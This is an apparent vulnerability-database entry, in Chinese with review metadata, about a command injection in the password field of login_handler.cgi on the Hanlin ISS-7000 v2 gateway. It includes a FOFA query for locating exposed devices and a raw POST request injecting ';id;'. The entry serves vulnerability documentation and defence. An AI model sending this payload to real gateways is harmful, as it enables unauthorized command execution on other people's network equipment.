---
source: "wy876 漏洞文库"
title: "瀚霖ISS-7000 v2网关 login_handler password命令注入"
product: "瀚霖ISS-7000 v2网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "文称1.00.06及1.00.08"
prerequisites: "登录前输入，admin是否必须未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zburq1ug9szxzm22"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%80%9A%E9%9C%96%E7%A7%91%E6%8A%80/%E7%80%9A%E9%9C%96%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8ISS-7000v2%E7%BD%91%E5%85%B3login_handler.cgi%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"css/login_form_style-06.css\""
fofa_unverified: "<font style="
id: "vw-bbee76bb5f04296c9b67fd5a"
entity_id: "ve-bbee76bb5f04296c9b67fd5a"
schema_version: "1"
---

# 瀚霖ISS-7000 v2网关 login_handler password命令注入

## 条目说明

- 对象与具体问题：瀚霖ISS-7000 v2网关；login_handler password命令注入
- 版本、配置及部署条件：文称1.00.06及1.00.08
- 认证与权限前提：登录前输入，admin是否必须未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 有明确固件号但无厂商公告/修复/返回证据，id是否执行需验证输出
- FOFA内font标签和元数据font污染，HTTP错标Java
- 不能由admin口令样例断定默认口令，补鉴权/命令拼接根因；迁网关类

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 ISS-7000 v2网络网关服务器是台高性能的网关，提供各类酒店网络认证计费的完整解决方案。由于智慧手机与平板电脑日渐普及，人们工作之时开始使用随身携带的设备，因此无线网络也成为网络使用者基本服务的项目。ISS-7000 v2可登录300至1000终端设备同时上网，并发量是一般设备的好几倍。为了提供安全上网服务，本公司专利技术所设计的动态使用者帐户生成器，能避免非使用者侵入酒店内部网络。

## 二、影响版本
1.00.06 和1.00.08

## 三、资产测绘
    - fofa `body="css/login_form_style-06.css"`
+ 特征


## 四 、漏洞复现
```http
POST /login_handler.cgi HTTP/1.1
Host: 
Content-Length: 79
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=admin;id;&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
```

> 请求长度说明：原资料 Content-Length 为 79；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zburq1ug9szxzm22>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
